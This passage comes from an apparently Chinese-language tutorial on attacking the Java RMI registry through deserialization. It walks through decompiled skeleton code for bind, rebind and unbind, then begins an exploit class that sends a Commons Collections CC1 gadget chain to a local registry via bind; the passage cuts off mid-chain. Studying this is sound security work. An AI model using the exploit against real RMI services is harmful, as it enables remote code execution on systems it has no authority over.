</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">3</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Remote</span><span class="w"> </span><span class="n">var8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">var97</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var97</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var11</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">var11</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var85</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var85</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var86</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var86</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">var6</span><span class="p">.</span><span class="na">rebind</span><span class="p">(</span><span class="n">var97</span><span class="p">,</span><span class="w"> </span><span class="n">var8</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var84</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var84</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li><!-- raw HTML omitted -->case4 &ndash; unbind<!-- raw HTML omitted --></li>
</ul>
<div class="code-block-container" id="code-1769750397358182500" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397358182500">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397358182500" title="Toggle" aria-expanded="false" aria-controls="code-1769750397358182500" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397358182500-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">4</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">var7</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var10</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var81</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var81</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var82</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var82</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">var6</span><span class="p">.</span><span class="na">unbind</span><span class="p">(</span><span class="n">var7</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var80</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var80</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h4 id="411-bindrebind">4.1.1 bind&amp;rebind<a hidden class="anchor" aria-hidden="true" href="#411-bindrebind">#</a></h4>
<p>调用 bind 时，会反序列化参数名和远程对象，如果服务端存在 cc 链</p>
<div class="code-block-container" id="code-1769750397361444500" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397361444500">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397361444500" title="Toggle" aria-expanded="false" aria-controls="code-1769750397361444500" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397361444500-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">var100</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Remote</span><span class="w"> </span><span class="n">var103</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//首先注册中心接收客户端请求，根据请求的 bind 方法进入 case0 分支，</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var105</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//然后进行反序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//第一个对象必须是 String</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var100</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var105</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//第二个对象被强转为 Remote</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var103</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">var105</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var94</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var94</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var95</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var95</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">var6</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="n">var100</span><span class="p">,</span><span class="w"> </span><span class="n">var103</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var93</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var93</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h5 id="exp">EXP：<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h5>
<div class="code-block-container" id="code-1769750397365528200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397365528200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397365528200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397365528200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397365528200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Remote</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AttackRegistryEXP</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="n">1099</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">CC1</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Proxy.newProxyInstance(...)：创建一个动态代理（JDK 动态代理），使之实现 Remote 接口并使用上面得到的 handler 来处理方法调用</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//这一步的作用是把构造的对象包装成 Remote 类型，以便能作为 bind 的第二个参数</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Remote</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Remote</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">cast</span><span class="p">(</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Remote</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Remote</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//向目标 RMI registry 发送请求，触发反序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;sTring&#34;</span><span class="p">,</span><span class="n">remote</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="c1">//下面就是以前分析过的 CC1 链 （TransformedMap 版  ）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">CC1</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
